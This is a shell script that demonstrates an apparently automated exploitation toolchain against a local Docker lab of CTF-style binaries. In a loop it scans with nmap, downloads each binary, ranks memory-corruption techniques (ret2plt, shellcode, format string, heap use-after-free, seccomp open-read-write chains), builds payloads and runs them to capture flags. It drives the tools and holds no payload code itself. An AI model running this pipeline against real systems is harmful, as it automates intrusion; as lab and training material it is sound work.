#!/bin/sh
# The augure/lictor demo: SIX targets, six different fact bases,
# six different decisions - the decision layer's showcase.
# Run from anywhere: sh lictor/lab/demo.sh
set -e
cd "$(dirname "$0")/.."
ROOT=$(pwd)

WORK=$(mktemp -d)
printf 'trail: demo-trail.jsonl\npacks: %s/../augure/packs\n' "$ROOT" >"$WORK/lictor.yml"

L="$ROOT/bin/lictor"

echo "=== 0. the lab is up (docker compose up -d --build) ==="
docker compose -f lab/docker-compose.yml up -d --build >/dev/null
sleep 1

echo "=== 1. scan (nmap finds the services, recorded in the trail) ==="
(cd "$WORK" && "$L" scan 127.0.0.1) | head -6

# target:port  binary  (the binaries are served over http)
STEP=2
for entry in "127.0.0.1:9999 ret2func" "127.0.0.1:9998 ret2plt" \
	"127.0.0.1:9997 shellcode" "127.0.0.1:9996 fmtstr"; do
	set -- $entry
	TGT=$1
	BIN=$2
	echo
	echo "=== $STEP. target $TGT ($BIN): acquire -> decide -> build -> run ==="
	STEP=$((STEP + 1))

	echo "[acquire] the binary: downloaded, ELF-checked, profiled, recorded"
	(cd "$WORK" && "$L" acquire "$TGT" --from "http://127.0.0.1:8000/$BIN") | head -2

	if [ "$BIN" = fmtstr ]; then
		echo "[decide] the source knowledge the profiler cannot see (printf is not a vuln):"
		(cd "$WORK" && "$L" suggest target.facts 'vuln("fmtstr").
fmtstr_read("true").' -o target.facts) | head -3
	fi
	echo "[decide] augure reads the facts and ranks the verified techniques:"
	(cd "$WORK" && "$L" plan target.facts -s 7) | head -6

	echo "[build] the offset is MEASURED (cyclic pattern under the debugger):"
	(cd "$WORK" && "$L" build "$BIN" --facts target.facts -o payload.bin -s 7) | head -4

	echo "[run] the closed loop (the executor discovers the exploit in the repos):"
	(cd "$WORK" && "$L" run "$TGT" --facts target.facts \
		--executor ronin --payload payload.bin --max-attempts 2 -s 7 \
		--flag-regex "FLAG\{[^}]+\}") | head -4
done

echo
echo "=== 6. the heap target: the facts the PROFILER cannot see come from knowledge ==="
echo "[suggest] vuln(uaf) + tcache + glibc 36 -> the decision shifts:"
(cd "$WORK" && "$L" acquire 127.0.0.1:9995 --from http://127.0.0.1:8000/uaf_heap >/dev/null)
(cd "$WORK" && "$L" suggest target.facts 'vuln("uaf").
allocator("tcache").
glibc_minor(36).
function_pointer_on_heap("true").' -o target.facts) | head -3
(cd "$WORK" && "$L" plan target.facts -s 7) | head -5

echo
echo "=== 7. the seccomp target: execve is dead, the orw chain is the answer ==="
echo "[suggest] seccomp(true) -> the decision flips to the orw chain:"
(cd "$WORK" && "$L" acquire 127.0.0.1:9994 --from http://127.0.0.1:8000/orw >/dev/null)
(cd "$WORK" && "$L" suggest target.facts 'seccomp("true").' -o target.facts) | head -3
echo "[harvest] the buffer leak -> leaked_address(input):"
(cd "$WORK" && "$L" harvest 127.0.0.1:9994 --facts target.facts) | head -3
(cd "$WORK" && "$L" plan target.facts -s 7) | head -5
echo "[build] the orw stub (the flag path embedded), measured offset:"
(cd "$WORK" && "$L" build orw --facts target.facts -o orw-payload.bin -s 7) | head -4

echo
echo "=== 8. the auditable engagement report (all six targets) ==="
(cd "$WORK" && "$L" report) | tail -30

echo
echo "demo done - the trail: $WORK/demo-trail.jsonl"
